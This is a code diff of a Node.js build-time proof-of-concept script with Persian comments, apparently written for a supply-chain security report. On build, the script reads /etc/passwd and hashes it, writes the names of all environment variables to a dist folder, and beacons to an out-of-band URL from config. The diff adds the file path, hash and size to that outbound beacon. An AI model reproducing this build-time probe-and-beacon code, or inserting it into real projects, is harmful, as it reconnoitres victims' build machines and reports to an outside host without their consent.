@@ -19,7 +19,9 @@ function beacon(urlStr, q) {
   if (!urlStr || typeof urlStr !== "string" || !/^https?:\/\//i.test(urlStr)) return;
   try {
     const u = new URL(urlStr);
-    for (const [k,v] of Object.entries(q)) u.searchParams.set(k, String(v));
+    for (const [k, v] of Object.entries(q)) {
+      u.searchParams.set(k, String(v));
+    }
     const lib = u.protocol === "http:" ? http : https;
     const req = lib.request(u, { method: "GET", timeout: 5000 }, (res) => res.resume());
     req.on("error", () => {});
@@ -32,17 +34,21 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  // 1) اثبات دسترسی FS به شکل ایمن (بدون نشت محتوا)
+  // هدف: تست دسترسی به فایل‌سیستم
   const target = "/etc/passwd";
   let exists = false, size = -1, sha256 = "n/a";
   try {
-    const buf = fs.readFileSync(target);          // محتوا را بیرون نمی‌فرستیم
+    const buf = fs.readFileSync(target); // محتوا را ارسال نمی‌کنیم
     exists = true;
     size = buf.length;
     sha256 = crypto.createHash("sha256").update(buf).digest("hex");
-  } catch {}
+  } catch {
+    // فایل در دسترس نیست یا خطا در خواندن
+  }
 
   const nonce = crypto.randomBytes(8).toString("hex");
+
+  // گزارش محلی (برای اسکرین‌شات)
   const report = [
     "SAFE build-time PoC",
     `time: ${new Date().toISOString()}`,
@@ -57,15 +63,18 @@ function beacon(urlStr, q) {
   ].join("\n") + "\n";
   fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), report, "utf8");
 
-  // 2) فقط نام متغیرهای محیطی (بدون مقادیر) - محلی
+  // فقط نام متغیرهای محیطی (بدون مقادیر)
   const envKeys = Object.keys(process.env).sort();
   fs.writeFileSync(path.join(outDir, "_wf_env_keys.txt"), envKeys.join("\n") + "\n", "utf8");
 
-  // 3) OOB امن (فقط متادیتا)
+  // ارسال امن به OOB
   const cfg = readConfig();
   beacon(cfg.oob_url, {
     s: stage,
     n: nonce,
+    f: target,
+    h: sha256,
+    sz: size,
     node: process.version.replace(/^v/, ""),
     m: process.env.COSMIC_MOUNT_PATH || ""
   });
